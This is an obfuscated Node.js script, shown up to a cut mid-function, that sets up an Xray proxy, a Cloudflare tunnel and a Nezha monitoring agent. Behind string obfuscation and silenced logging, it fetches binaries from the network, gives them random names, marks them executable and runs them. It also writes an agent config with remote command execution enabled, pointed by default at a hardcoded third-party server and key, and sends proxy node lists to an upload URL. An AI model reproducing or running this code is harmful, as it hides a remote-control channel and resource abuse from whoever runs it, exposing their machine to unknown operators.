#!/usr/bin/env node

const _0xfeddc6 = _0x1084
;(function (_0xdc26ec, _0x4ac08b) {
  const _0xacb7a4 = { _0x34204b: 0x1da, _0x483232: 0xbd, _0x216a82: 0xf3, _0xec843a: 0x1a9 },
    _0x2deba7 = _0x1084,
    _0x921a37 = _0xdc26ec()
  while (!![]) {
    try {
      const _0x362a4e =
        (parseInt(_0x2deba7(_0xacb7a4._0x34204b)) / 0x1) * (-parseInt(_0x2deba7(0xc4)) / 0x2) +
        (parseInt(_0x2deba7(0x176)) / 0x3) * (parseInt(_0x2deba7(0x10a)) / 0x4) +
        parseInt(_0x2deba7(0xde)) / 0x5 +
        (-parseInt(_0x2deba7(0x164)) / 0x6) * (-parseInt(_0x2deba7(_0xacb7a4._0x483232)) / 0x7) +
        (parseInt(_0x2deba7(_0xacb7a4._0x216a82)) / 0x8) * (parseInt(_0x2deba7(0x13c)) / 0x9) +
        parseInt(_0x2deba7(0x180)) / 0xa +
        (-parseInt(_0x2deba7(_0xacb7a4._0xec843a)) / 0xb) * (parseInt(_0x2deba7(0x17c)) / 0xc)
      if (_0x362a4e === _0x4ac08b) break
      else _0x921a37['push'](_0x921a37['shift']())
    } catch (_0x18a9b4) {
      _0x921a37['push'](_0x921a37['shift']())
    }
  }
})(_0x543c, 0x221c8)
const http = require(_0xfeddc6(0x1c3)),
  axios = require(_0xfeddc6(0x1d1)),
  os = require('os'),
  fs = require('fs'),
  path = require(_0xfeddc6(0x1a2)),
  crypto = require(_0xfeddc6(0x129)),
  { promisify } = require(_0xfeddc6(0x177)),
  { exec: execCommand, execSync } = require(_0xfeddc6(0x12c)),
  exec = promisify(execCommand),
  PORT = process[_0xfeddc6(0x1bb)][_0xfeddc6(0xd6)] || 0xbb8,
  SUB_PATH = process[_0xfeddc6(0x1bb)][_0xfeddc6(0x19c)] || _0xfeddc6(0xd5),
  NAME = process['env'][_0xfeddc6(0x158)] || 'js-node',
  CFIP = process[_0xfeddc6(0x1bb)][_0xfeddc6(0x173)] || _0xfeddc6(0x1b9),
  CFPORT = process[_0xfeddc6(0x1bb)][_0xfeddc6(0x182)] || 0x1bb,
  UPLOAD_URL = process[_0xfeddc6(0x1bb)][_0xfeddc6(0x16f)] || '',
  PROJECT_URL = process[_0xfeddc6(0x1bb)][_0xfeddc6(0x1bc)] || '',
  AUTO_ACCESS = process['env'][_0xfeddc6(0x185)] || ![],
  FILE_PATH = process[_0xfeddc6(0x1bb)][_0xfeddc6(0x1b8)] || _0xfeddc6(0x1df),
  NEZHA_SERVER = process[_0xfeddc6(0x1bb)][_0xfeddc6(0xfe)] || 'nezha.933993.xyz:443',
  NEZHA_PORT = process['env']['NEZHA_PORT'] || '',
  NEZHA_KEY = process['env'][_0xfeddc6(0x15f)] || '66ObGFyWnpwsEsGhy5y2jcBf21YSltY8',
  UUID = process[_0xfeddc6(0x1bb)][_0xfeddc6(0x178)] || _0xfeddc6(0x14f),
  ARGO_AUTH =
    process[_0xfeddc6(0x1bb)][_0xfeddc6(0x10e)] ||
    'eyJhIjoiNmZmODU4N2QwZDM1OGZiYzUyOTk2ZGI0NjUwNjZjNWUiLCJ0IjoiYWU2ZDIyN2MtMWRmZi00MjA2LWEyYWMtODI0MmRmNTZkMjdlIiwicyI6Ik1UQXlZalpsTnpjdFpEVTJZeTAwWm1OaExXRXpNemd0TVRFMll6Z3hZVFUwTkRWayJ9',
  ARGO_DOMAIN = process[_0xfeddc6(0x1bb)][_0xfeddc6(0x15a)] || _0xfeddc6(0xdb),
  ARGO_PORT = process[_0xfeddc6(0x1bb)][_0xfeddc6(0x14c)] || 0xe2e1,
  S5_PORT = process['env']['S5_PORT'] || '',
  HY2_PORT = process['env'][_0xfeddc6(0x1bd)] || '',
  REALITY_PORT = process[_0xfeddc6(0x1bb)][_0xfeddc6(0x15b)] || '',
  CHAT_ID = process[_0xfeddc6(0x1bb)][_0xfeddc6(0xf6)] || _0xfeddc6(0x17b),
  BOT_TOKEN = process[_0xfeddc6(0x1bb)][_0xfeddc6(0x14e)] || _0xfeddc6(0x139),
  SHOW_LOG = ![_0xfeddc6(0x17d), 'disable', 'no'][_0xfeddc6(0x160)](
    (process[_0xfeddc6(0x1bb)][_0xfeddc6(0x132)] || _0xfeddc6(0x17d))[_0xfeddc6(0x11b)]()
  )
!SHOW_LOG && ((console[_0xfeddc6(0x188)] = () => {}), (console['error'] = () => {}))
function alwaysLog(_0x1d648b) {
  const _0x4e8bd5 = _0xfeddc6
  process[_0x4e8bd5(0x1c6)][_0x4e8bd5(0x181)](_0x1d648b + '\x0a')
}
if (!fs[_0xfeddc6(0x101)](FILE_PATH)) fs[_0xfeddc6(0xda)](FILE_PATH)
else {
}
function isValidPort(_0xce014f) {
  const _0x401071 = { _0xa93515: 0x1d6, _0x4b3315: 0x13e },
    _0x233ab8 = _0xfeddc6
  try {
    if (_0xce014f === null || _0xce014f === undefined || _0xce014f === '') return ![]
    if (typeof _0xce014f === _0x233ab8(_0x401071._0xa93515) && _0xce014f[_0x233ab8(_0x401071._0x4b3315)]() === '') return ![]
    const _0x277fe4 = parseInt(_0xce014f)
    if (isNaN(_0x277fe4)) return ![]
    if (_0x277fe4 < 0x1 || _0x277fe4 > 0xffff) return ![]
    return !![]
  } catch (_0x386102) {
    return ![]
  }
}
function generateRandomName() {
  const _0x57a69d = { _0x593238: 0x112, _0x50c4e0: 0x1b1, _0xeb966b: 0xe3 },
    _0x2fd760 = _0xfeddc6,
    _0x2fa572 = _0x2fd760(_0x57a69d._0x593238)
  let _0x23fd5a = ''
  for (let _0x2bf80d = 0x0; _0x2bf80d < 0x6; _0x2bf80d++) {
    _0x23fd5a += _0x2fa572[_0x2fd760(_0x57a69d._0x50c4e0)](
      Math[_0x2fd760(_0x57a69d._0xeb966b)](Math[_0x2fd760(0x1c1)]() * _0x2fa572[_0x2fd760(0x168)])
    )
  }
  return _0x23fd5a
}
let subContent = null,
  privateKey = '',
  publicKey = ''
const npmName = generateRandomName(),
  webName = generateRandomName(),
  botName = generateRandomName(),
  phpName = generateRandomName()
let npmPath = path[_0xfeddc6(0x1ce)](FILE_PATH, npmName),
  phpPath = path[_0xfeddc6(0x1ce)](FILE_PATH, phpName),
  webPath = path[_0xfeddc6(0x1ce)](FILE_PATH, webName),
  botPath = path[_0xfeddc6(0x1ce)](FILE_PATH, botName),
  subPath = path[_0xfeddc6(0x1ce)](FILE_PATH, 'sub.txt'),
  listPath = path[_0xfeddc6(0x1ce)](FILE_PATH, 'list.txt'),
  bootLogPath = path['join'](FILE_PATH, _0xfeddc6(0x11d)),
  configPath = path[_0xfeddc6(0x1ce)](FILE_PATH, _0xfeddc6(0x147)),
  certPath = path['resolve'](FILE_PATH, 'cert.pem'),
  keyPath = path[_0xfeddc6(0x1d8)](FILE_PATH, 'private.key')
function deleteNodes() {
  const _0x57c2fe = { _0x155af7: 0x166, _0x3c9b88: 0x190, _0x252896: 0x159, _0xc9ec9a: 0xc3, _0x135f13: 0x18c },
    _0x52a5ae = _0xfeddc6
  try {
    if (!UPLOAD_URL) return
    if (!fs[_0x52a5ae(0x101)](subPath)) return
    let _0x3f47ab
    try {
      _0x3f47ab = fs[_0x52a5ae(_0x57c2fe._0x155af7)](subPath, 'utf-8')
    } catch {
      return null
    }
    const _0x12722f = Buffer[_0x52a5ae(_0x57c2fe._0x3c9b88)](_0x3f47ab, _0x52a5ae(0x19b))[_0x52a5ae(_0x57c2fe._0x252896)]('utf-8'),
      _0x5305a1 = _0x12722f[_0x52a5ae(_0x57c2fe._0xc9ec9a)]('\x0a')['filter']((_0x11484b) =>
        /(vless|vmess|trojan|hysteria2|socks):\/\//[_0x52a5ae(0x16d)](_0x11484b)
      )
    if (_0x5305a1[_0x52a5ae(0x168)] === 0x0) return
    return (
      axios[_0x52a5ae(0x1d2)](UPLOAD_URL + _0x52a5ae(0x191), JSON[_0x52a5ae(0xbf)]({ nodes: _0x5305a1 }), {
        headers: { 'Content-Type': 'application/json' }
      })[_0x52a5ae(_0x57c2fe._0x135f13)]((_0x214df4) => {
        return null
      }),
      null
    )
  } catch (_0x198aea) {
    return null
  }
}
function cleanupOldFiles() {
  const _0x1cd2c0 = { _0x401c0e: 0x1ce, _0x2ed472: 0x1e0, _0x35a747: 0x1aa },
    _0x1cc2e7 = _0xfeddc6
  try {
    const _0x2b69cd = fs[_0x1cc2e7(0x125)](FILE_PATH)
    _0x2b69cd['forEach']((_0x112d81) => {
      const _0x12c365 = _0x1cc2e7,
        _0x4f13ce = path[_0x12c365(_0x1cd2c0._0x401c0e)](FILE_PATH, _0x112d81)
      try {
        const _0x5e2e02 = fs[_0x12c365(_0x1cd2c0._0x2ed472)](_0x4f13ce)
        _0x5e2e02[_0x12c365(0x124)]() && fs[_0x12c365(_0x1cd2c0._0x35a747)](_0x4f13ce)
      } catch (_0x230461) {}
    })
  } catch (_0x2213ee) {}
}
function generateX25519Keypair() {
  const _0x7ba4af = { _0x206e43: 0xbb, _0x57f272: 0x148, _0x1e9e11: 0x115 },
    _0x4631bb = _0xfeddc6,
    { publicKey: _0x38a4d1, privateKey: _0x2fda3b } = crypto['generateKeyPairSync'](_0x4631bb(_0x7ba4af._0x206e43)),
    _0x162b15 = _0x2fda3b[_0x4631bb(0xd3)]({ type: _0x4631bb(0xff), format: _0x4631bb(0x197) })[_0x4631bb(_0x7ba4af._0x57f272)](-0x20),
    _0x5693ef = _0x38a4d1[_0x4631bb(0xd3)]({ type: _0x4631bb(_0x7ba4af._0x1e9e11), format: 'der' })['subarray'](-0x20)
  return { privateKey: _0x162b15[_0x4631bb(0x159)]('base64url'), publicKey: _0x5693ef['toString'](_0x4631bb(0xce)) }
}
function generateOrLoadKeyPair() {
  const _0x2666ee = { _0x39a483: 0x166, _0x1c26d3: 0xbc, _0x3f7d9b: 0xba, _0x668643: 0x13e, _0x287143: 0xdd, _0xc9cda: 0xb5, _0x3a0474: 0x188 },
    _0x4e6de5 = _0xfeddc6,
    _0x59a0da = path[_0x4e6de5(0x1ce)](FILE_PATH, 'key.txt')
  if (fs[_0x4e6de5(0x101)](_0x59a0da)) {
    const _0x209647 = fs[_0x4e6de5(_0x2666ee._0x39a483)](_0x59a0da, _0x4e6de5(_0x2666ee._0x1c26d3)),
      _0x344825 = _0x209647['match'](/PrivateKey:\s*(.*)/),
      _0x4427d8 = _0x209647[_0x4e6de5(_0x2666ee._0x3f7d9b)](/PublicKey:\s*(.*)/)
    if (_0x344825 && _0x4427d8) {
      ;((privateKey = _0x344825[0x1][_0x4e6de5(_0x2666ee._0x668643)]()),
        (publicKey = _0x4427d8[0x1][_0x4e6de5(_0x2666ee._0x668643)]()),
        console[_0x4e6de5(0x188)](_0x4e6de5(0xd0), privateKey),
        console[_0x4e6de5(0x188)](_0x4e6de5(0x1ca), publicKey))
      return
    }
  }
  const _0x109e0f = generateX25519Keypair()
  ;((privateKey = _0x109e0f[_0x4e6de5(0x135)]),
    (publicKey = _0x109e0f[_0x4e6de5(_0x2666ee._0x287143)]),
    fs['writeFileSync'](_0x59a0da, _0x4e6de5(_0x2666ee._0xc9cda) + privateKey + _0x4e6de5(0x1a8) + publicKey + '\x0a', _0x4e6de5(0xbc)),
    console[_0x4e6de5(0x188)](_0x4e6de5(0xd0), privateKey),
    console[_0x4e6de5(_0x2666ee._0x3a0474)]('Public\x20Key:', publicKey))
}
const FALLBACK_EC_KEY =
    _0xfeddc6(0x120) +
    _0xfeddc6(0x18e) +
    _0xfeddc6(0x1c9) +
    _0xfeddc6(0xb4) +
    'MHcCAQEEIM4792SEtPqIt1ywqTd/0bYidBqpYV/++siNnfBYsdUYoAoGCCqGSM49\x0a' +
    _0xfeddc6(0x118) +
    '/TsyLyFoPkhLxSbehH/NBEjHtSZGaDhMqQ==\x0a' +
    _0xfeddc6(0x187),
  FALLBACK_CERT =
    _0xfeddc6(0x10b) +
    _0xfeddc6(0x1d3) +
    _0xfeddc6(0x199) +
    _0xfeddc6(0x10d) +
    _0xfeddc6(0x165) +
    _0xfeddc6(0xc0) +
    'BfGbgkrMNzAfBgNVHSMEGDAWgBTV1cFID7UISE7PLTBRBfGbgkrMNzAPBgNVHRMB\x0a' +
    _0xfeddc6(0x106) +
    _0xfeddc6(0x198) +
    _0xfeddc6(0xb9)
function ensureTlsCertificates(_0x241e08, _0x510d03) {
  const _0x5630ca = { _0x96dc42: 0x101, _0x5387f3: 0x1b2, _0x528e99: 0x13b, _0x4c2588: 0x108, _0xd28771: 0x167, _0x3e1e63: 0x12b },
    _0x2ff7d6 = _0xfeddc6
  if (fs[_0x2ff7d6(0x101)](_0x241e08) && fs[_0x2ff7d6(_0x5630ca._0x96dc42)](_0x510d03)) return
  fs[_0x2ff7d6(0xda)](path[_0x2ff7d6(0x141)](_0x241e08), { recursive: !![] })
  try {
    ;(execSync(_0x2ff7d6(0x170), { stdio: _0x2ff7d6(_0x5630ca._0x5387f3) }),
      execSync(_0x2ff7d6(_0x5630ca._0x528e99) + _0x510d03 + '\x22', { stdio: _0x2ff7d6(0x1b2) }),
      execSync(
        'openssl\x20req\x20-new\x20-x509\x20-days\x203650\x20-key\x20\x22' +
          _0x510d03 +
          _0x2ff7d6(_0x5630ca._0x4c2588) +
          _0x241e08 +
          _0x2ff7d6(_0x5630ca._0xd28771),
        { stdio: _0x2ff7d6(0x1b2) }
      ))
    return
  } catch (_0x12fd1f) {}
  ;(fs[_0x2ff7d6(0x12b)](_0x510d03, FALLBACK_EC_KEY), fs[_0x2ff7d6(_0x5630ca._0x3e1e63)](_0x241e08, FALLBACK_CERT))
}
function getCertificateFingerprint(_0x2b56c8) {
  const _0x1e1cf8 = {
      _0x177f8d: 0x13e,
      _0x118273: 0xba,
      _0x39279f: 0xfb,
      _0x5b6921: 0x19b,
      _0x5eef02: 0x1b4,
      _0x12d488: 0xe2,
      _0x15ee5e: 0xe1,
      _0xa7d979: 0x1ba
    },
    _0x146e7d = _0xfeddc6
  try {
    const _0xabc81e = execSync(_0x146e7d(0x130) + _0x2b56c8 + '\x22', { encoding: _0x146e7d(0xbc), timeout: 0xbb8 })[
        _0x146e7d(_0x1e1cf8._0x177f8d)
      ](),
      _0x288745 = _0xabc81e[_0x146e7d(_0x1e1cf8._0x118273)](/=(.+)$/)
    if (_0x288745 && _0x288745[0x1]) return _0x288745[0x1][_0x146e7d(_0x1e1cf8._0x39279f)]()
  } catch (_0x486ae8) {}
  try {
    const _0x526da4 = fs['readFileSync'](_0x2b56c8, _0x146e7d(0xbc)),
      _0x227e06 = _0x526da4['match'](/-----BEGIN CERTIFICATE-----([\s\S]+?)-----END CERTIFICATE-----/)
    if (!_0x227e06) return ''
    const _0xd54585 = _0x227e06[0x1]['replace'](/\s/g, ''),
      _0x4280b9 = Buffer[_0x146e7d(0x190)](_0xd54585, _0x146e7d(_0x1e1cf8._0x5b6921)),
      _0x5b8073 = crypto['createHash'](_0x146e7d(_0x1e1cf8._0x5eef02))
        [_0x146e7d(_0x1e1cf8._0x12d488)](_0x4280b9)
        [_0x146e7d(_0x1e1cf8._0x15ee5e)](_0x146e7d(_0x1e1cf8._0xa7d979))
    return _0x5b8073[_0x146e7d(0xba)](/.{2}/g)[_0x146e7d(0x1ce)](':')[_0x146e7d(0xfb)]()
  } catch (_0x21acbc) {
    return (console['error'](_0x146e7d(0x152), _0x21acbc), '')
  }
}
function _0x1084(_0x4bafdd, _0x18f6af) {
  const _0x543ccc = _0x543c()
  return (
    (_0x1084 = function (_0x1084c1, _0x252462) {
      _0x1084c1 = _0x1084c1 - 0xb4
      let _0x18acc8 = _0x543ccc[_0x1084c1]
      return _0x18acc8
    }),
    _0x1084(_0x4bafdd, _0x18f6af)
  )
}
async function generateConfig() {
  const _0x10ce14 = {
      _0x2f97a6: 0xec,
      _0x2a8f39: 0xc1,
      _0x4f3385: 0xe6,
      _0x549e3b: 0x146,
      _0x22225f: 0x189,
      _0x4584a4: 0x1c3,
      _0x38f704: 0x16b,
      _0x4e61fc: 0x15e,
      _0x2824ef: 0x104,
      _0x3c1c46: 0x19f,
      _0x4d43be: 0x1cd,
      _0x26fc78: 0x1de,
      _0x19b4d9: 0x163,
      _0x3bf4f9: 0x142,
      _0xb84e3e: 0x18d,
      _0x28f4ec: 0x16c,
      _0xd41bcb: 0x1bf,
      _0x2b2662: 0x16c,
      _0xff0a24: 0xd9,
      _0x1d69ce: 0x107,
      _0x5a932: 0x12b
    },
    _0x57c227 = _0xfeddc6,
    _0x27ca04 = {
      log: { access: _0x57c227(0x14d), error: '/dev/null', loglevel: _0x57c227(0x189) },
      inbounds: [
        {
          tag: _0x57c227(_0x10ce14._0x2f97a6),
          port: ARGO_PORT,
          listen: '::',
          protocol: _0x57c227(0x146),
          settings: {
            clients: [{ id: UUID, flow: _0x57c227(0x19d) }],
            decryption: _0x57c227(0x189),
            fallbacks: [
              { dest: 0xbb9 },
              { path: '/vless-argo', dest: 0xbba },
              { path: '/vmess-argo', dest: 0xbbb },
              { path: _0x57c227(0x15e), dest: 0xbbc }
            ]
          },
          streamSettings: { network: 'tcp' }
        },
        {
          tag: _0x57c227(0x1dc),
          port: 0xbb9,
          listen: '127.0.0.1',
          protocol: _0x57c227(0x146),
          settings: { clients: [{ id: UUID }], decryption: _0x57c227(0x189) },
          streamSettings: { network: 'tcp', security: _0x57c227(0x189) }
        },
        {
          tag: _0x57c227(_0x10ce14._0x2a8f39),
          port: 0xbba,
          listen: _0x57c227(_0x10ce14._0x4f3385),
          protocol: _0x57c227(_0x10ce14._0x549e3b),
          settings: { clients: [{ id: UUID, level: 0x0 }], decryption: _0x57c227(_0x10ce14._0x22225f) },
          streamSettings: { network: 'ws', security: _0x57c227(_0x10ce14._0x22225f), wsSettings: { path: _0x57c227(0x1b3) } },
          sniffing: { enabled: !![], destOverride: [_0x57c227(_0x10ce14._0x4584a4), _0x57c227(0x16b), _0x57c227(0x104)], metadataOnly: ![] }
        },
        {
          tag: 'vmess-ws-in',
          port: 0xbbb,
          listen: _0x57c227(0xe6),
          protocol: _0x57c227(0x1ac),
          settings: { clients: [{ id: UUID, alterId: 0x0 }] },
          streamSettings: { network: 'ws', wsSettings: { path: _0x57c227(0xb6) } },
          sniffing: { enabled: !![], destOverride: [_0x57c227(0x1c3), _0x57c227(_0x10ce14._0x38f704), 'quic'], metadataOnly: ![] }
        },
        {
          tag: 'trojan-ws-in',
          port: 0xbbc,
          listen: _0x57c227(_0x10ce14._0x4f3385),
          protocol: _0x57c227(0x13d),
          settings: { clients: [{ password: UUID }] },
          streamSettings: { network: 'ws', security: _0x57c227(0x189), wsSettings: { path: _0x57c227(_0x10ce14._0x4e61fc) } },
          sniffing: { enabled: !![], destOverride: [_0x57c227(0x1c3), _0x57c227(0x16b), _0x57c227(_0x10ce14._0x2824ef)], metadataOnly: ![] }
        }
      ],
      dns: { servers: [_0x57c227(_0x10ce14._0x3c1c46)] },
      outbounds: [
        { protocol: _0x57c227(_0x10ce14._0x4d43be), tag: _0x57c227(_0x10ce14._0x26fc78) },
        { protocol: 'blackhole', tag: 'block' }
      ]
    }
  ;(isValidPort(REALITY_PORT) &&
    _0x27ca04[_0x57c227(_0x10ce14._0x19b4d9)][_0x57c227(0x16c)]({
      tag: _0x57c227(_0x10ce14._0x3bf4f9),
      listen: '::',
      port: parseInt(REALITY_PORT),
      protocol: _0x57c227(0x146),
      settings: { clients: [{ id: UUID, flow: _0x57c227(0x19d) }], decryption: _0x57c227(0x189) },
      streamSettings: {
        network: 'raw',
        security: _0x57c227(_0x10ce14._0xb84e3e),
        realitySettings: { show: ![], dest: _0x57c227(0x194), xver: 0x0, serverNames: [_0x57c227(0x1c0)], privateKey: privateKey, shortIds: [''] }
      }
    }),
    isValidPort(HY2_PORT) &&
      _0x27ca04['inbounds'][_0x57c227(_0x10ce14._0x28f4ec)]({
        tag: 'hysteria-in',
        listen: '::',
        port: parseInt(HY2_PORT),
        protocol: _0x57c227(0x1bf),
        settings: { version: 0x2, clients: [{ auth: UUID }] },
        streamSettings: {
          network: _0x57c227(_0x10ce14._0xd41bcb),
          hysteriaSettings: { version: 0x2, masquerade: { type: _0x57c227(0xcf), url: _0x57c227(0x157) } },
          security: _0x57c227(0x16b),
          tlsSettings: { alpn: ['h3'], certificates: [{ certificateFile: certPath, keyFile: keyPath }] }
        }
      }),
    isValidPort(S5_PORT) &&
      _0x27ca04[_0x57c227(_0x10ce14._0x19b4d9)][_0x57c227(_0x10ce14._0x2b2662)]({
        tag: 's5-in',
        listen: '::',
        port: parseInt(S5_PORT),
        protocol: _0x57c227(0x196),
        settings: {
          auth: _0x57c227(_0x10ce14._0xff0a24),
          accounts: [{ user: UUID['substring'](0x0, 0x8), pass: UUID[_0x57c227(_0x10ce14._0x1d69ce)](-0xc) }],
          udp: !![]
        }
      }),
    fs[_0x57c227(_0x10ce14._0x5a932)](path[_0x57c227(0x1ce)](FILE_PATH, 'config.json'), JSON[_0x57c227(0xbf)](_0x27ca04, null, 0x2)))
}
function getSystemArchitecture() {
  const _0x322094 = { _0x3d4fac: 0x1a0, _0x1e6806: 0x1cf, _0x71a875: 0x11f },
    _0x1c59e9 = _0xfeddc6,
    _0x4b93dd = os[_0x1c59e9(_0x322094._0x3d4fac)]()
  return _0x4b93dd === 'arm' || _0x4b93dd === _0x1c59e9(0x144) || _0x4b93dd === 'aarch64'
    ? _0x1c59e9(_0x322094._0x1e6806)
    : _0x1c59e9(_0x322094._0x71a875)
}
function downloadFile(_0x5eea6b, _0x57e55d, _0x947909) {
  const _0x187208 = { _0x32e8e2: 0x109, _0x40bd67: 0x100, _0x2842ca: 0x150, _0x44f63d: 0x161, _0x59b29d: 0x15c },
    _0x2d73f5 = _0xfeddc6,
    _0x1bf7be = _0x5eea6b,
    _0x4ccad3 = _0x1bf7be + '.download'
  !fs[_0x2d73f5(0x101)](FILE_PATH) && fs[_0x2d73f5(0xda)](FILE_PATH, { recursive: !![] })
  const _0x3eb48b = fs[_0x2d73f5(0x133)](_0x4ccad3)
  axios({ method: 'get', url: _0x57e55d, responseType: 'stream' })
    ['then']((_0x183b50) => {
      const _0x11eeea = { _0x8bc5ba: 0x161 },
        _0x357918 = _0x2d73f5
      ;(_0x183b50[_0x357918(0x131)][_0x357918(0xe7)](_0x3eb48b),
        _0x3eb48b['on'](_0x357918(0x171), () => {
          const _0x31f891 = { _0x1cd1d6: 0x100, _0x119098: 0x17f, _0x17875b: 0x109, _0x7e0355: 0x100, _0x15963e: 0x150 }
          _0x3eb48b['close']((_0x2401c9) => {
            const _0x1c4b75 = _0x1084
            if (_0x2401c9) {
              const _0x15cf0a =
                _0x1c4b75(_0x31f891._0x1cd1d6) + path[_0x1c4b75(0x150)](_0x1bf7be) + _0x1c4b75(_0x31f891._0x119098) + _0x2401c9[_0x1c4b75(0x161)]
              ;(fs[_0x1c4b75(_0x31f891._0x17875b)](_0x4ccad3, () => {}), console['error'](_0x15cf0a), _0x947909(_0x15cf0a))
              return
            }
            try {
              fs[_0x1c4b75(0xf0)](_0x4ccad3, _0x1bf7be)
            } catch (_0x2c7e45) {
              const _0x1bf841 = 'Download\x20' + path['basename'](_0x1bf7be) + _0x1c4b75(0x17f) + _0x2c7e45[_0x1c4b75(0x161)]
              ;(fs['unlink'](_0x4ccad3, () => {}), console[_0x1c4b75(0x15c)](_0x1bf841), _0x947909(_0x1bf841))
              return
            }
            ;(console[_0x1c4b75(0x188)](_0x1c4b75(_0x31f891._0x7e0355) + path[_0x1c4b75(_0x31f891._0x15963e)](_0x1bf7be) + _0x1c4b75(0x113)),
              _0x947909(null, _0x1bf7be))
          })
        }),
        _0x3eb48b['on'](_0x357918(0x15c), (_0xbb2b65) => {
          const _0x3cd9a1 = _0x357918
          fs['unlink'](_0x4ccad3, () => {})
          const _0x4c1200 = _0x3cd9a1(0x100) + path[_0x3cd9a1(0x150)](_0x1bf7be) + _0x3cd9a1(0x17f) + _0xbb2b65[_0x3cd9a1(_0x11eeea._0x8bc5ba)]
          ;(console[_0x3cd9a1(0x15c)](_0x4c1200), _0x947909(_0x4c1200))
        }))
    })
    [_0x2d73f5(0x18c)]((_0x30079f) => {
      const _0x8603c3 = _0x2d73f5
      fs[_0x8603c3(_0x187208._0x32e8e2)](_0x4ccad3, () => {})
      const _0x245901 =
        _0x8603c3(_0x187208._0x40bd67) +
        path[_0x8603c3(_0x187208._0x2842ca)](_0x1bf7be) +
        '\x20failed:\x20' +
        _0x30079f[_0x8603c3(_0x187208._0x44f63d)]
      ;(console[_0x8603c3(_0x187208._0x59b29d)](_0x245901), _0x947909(_0x245901))
    })
}
async function downloadFilesAndRun() {
  const _0x315d15 = {
      _0x56c7ab: 0x168,
      _0x3b5e8a: 0xc3,
      _0x149510: 0xe4,
      _0x568879: 0xf1,
      _0x551135: 0x193,
      _0xfd27ed: 0x18b,
      _0x2dd083: 0x116,
      _0x243eef: 0x17d,
      _0xbbaf53: 0x111,
      _0x4a1904: 0x16e,
      _0x123cd4: 0x1a7,
      _0x5f0b03: 0x188,
      _0x269d6e: 0xd8,
      _0x333b74: 0x15c,
      _0x5e02c4: 0x1a6,
      _0x1afefa: 0xe4,
      _0x1485da: 0x193,
      _0x3c6c42: 0x18b,
      _0x55220b: 0x1b7,
      _0x5298c3: 0x1a4,
      _0x1728ad: 0xd8,
      _0x4d70a8: 0x183,
      _0x5336d5: 0x188,
      _0x5af03b: 0xdc,
      _0x1d19f5: 0x101,
      _0x5e1f84: 0xba,
      _0x356e94: 0x103,
      _0x1f8a66: 0xef,
      _0x3f9501: 0xe5,
      _0x8f8d80: 0x1c4,
      _0x2e09a3: 0x1d8,
      _0x4e81a2: 0xbe
    },
    _0x404880 = _0xfeddc6,
    _0x304546 = getSystemArchitecture(),
    _0x147d25 = getFilesForArchitecture(_0x304546)
  if (_0x147d25[_0x404880(_0x315d15._0x56c7ab)] === 0x0) {
    console['log'](_0x404880(0xd2))
    return
  }
  const _0x279d22 = _0x147d25[_0x404880(0x13a)]((_0xa034d8) => {
    return new Promise((_0xaaff3, _0x15d293) => {
      const _0x3879a8 = (_0x1a4a7f) => {
        const _0x34c0b9 = { _0x5c7b31: 0xdf, _0x186179: 0x168, _0x32eb01: 0x10c, _0x164265: 0x150 },
          _0x571e0c = _0x1084
        downloadFile(_0xa034d8[_0x571e0c(0x1a1)], _0xa034d8[_0x571e0c(0xdf)][_0x1a4a7f], (_0x2b2a20, _0x16efbe) => {
          const _0x120675 = _0x571e0c
          if (!_0x2b2a20) {
            _0xaaff3(_0x16efbe)
            return
          }
          if (_0x1a4a7f + 0x1 < _0xa034d8[_0x120675(_0x34c0b9._0x5c7b31)][_0x120675(_0x34c0b9._0x186179)]) {
            ;(console[_0x120675(0x188)](
              _0x120675(_0x34c0b9._0x32eb01) + path[_0x120675(_0x34c0b9._0x164265)](_0xa034d8['fileName']) + _0x120675(0x184)
            ),
              _0x3879a8(_0x1a4a7f + 0x1))
            return
          }
          _0x15d293(_0x2b2a20)
        })
      }
      _0x3879a8(0x0)
    })
  })
  try {
    await Promise[_0x404880(0x172)](_0x279d22)
  } catch (_0x14e7f0) {
    console[_0x404880(0x15c)]('Error\x20downloading\x20files:', _0x14e7f0)
    return
  }
  function _0x3c32b7(_0x84539f) {
    const _0xf3f850 = { _0xdec382: 0x159, _0x1eaf28: 0xfa },
      _0x501676 = 0x1fd
    _0x84539f['forEach']((_0x3c5ef3) => {
      const _0x3e374d = _0x1084
      if (fs['existsSync'](_0x3c5ef3))
        try {
          ;(fs['chmodSync'](_0x3c5ef3, _0x501676),
            console[_0x3e374d(0x188)](_0x3e374d(0x127) + _0x3c5ef3 + ':\x20' + _0x501676[_0x3e374d(_0xf3f850._0xdec382)](0x8)))
        } catch (_0x3981a5) {
          console['error'](_0x3e374d(_0xf3f850._0x1eaf28) + _0x3c5ef3 + ':\x20' + _0x3981a5)
        }
    })
  }
  const _0x31233b = NEZHA_PORT ? [npmPath, webPath, botPath] : [phpPath, webPath, botPath]
  _0x3c32b7(_0x31233b)
  if (NEZHA_SERVER && NEZHA_KEY) {
    if (!NEZHA_PORT) {
      const _0x57b67d = NEZHA_SERVER[_0x404880(0x160)](':') ? NEZHA_SERVER[_0x404880(_0x315d15._0x3b5e8a)](':')[_0x404880(0xcc)]() : '',
        _0x13f56d = new Set([
          _0x404880(0x1a6),
          _0x404880(_0x315d15._0x149510),
          _0x404880(_0x315d15._0x568879),
          _0x404880(_0x315d15._0x551135),
          _0x404880(_0x315d15._0xfd27ed),
          _0x404880(0x1b7)
        ]),
        _0x4ece28 = _0x13f56d[_0x404880(0x195)](_0x57b67d) ? _0x404880(_0x315d15._0x2dd083) : _0x404880(_0x315d15._0x243eef),
        _0x3a2e82 =
          '\x0aclient_secret:\x20' +
          NEZHA_KEY +
          '\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20' +
          NEZHA_SERVER +
          _0x404880(0x1d4) +
          _0x4ece28 +
          _0x404880(0xea) +
          UUID
      fs['writeFileSync'](path[_0x404880(0x1ce)](FILE_PATH, _0x404880(0xc5)), _0x3a2e82)
      const _0x5f0d2b = _0x404880(_0x315d15._0xbbaf53) + phpPath + _0x404880(_0x315d15._0x4a1904) + FILE_PATH + _0x404880(_0x315d15._0x123cd4)
      try {
        ;(await exec(_0x5f0d2b),
          console[_0x404880(_0x315d15._0x5f0b03)](phpName + _0x404880(_0x315d15._0x269d6e)),
          await new Promise((_0x308645) => setTimeout(_0x308645, 0x3e8)))
      } catch (_0x288c6d) {
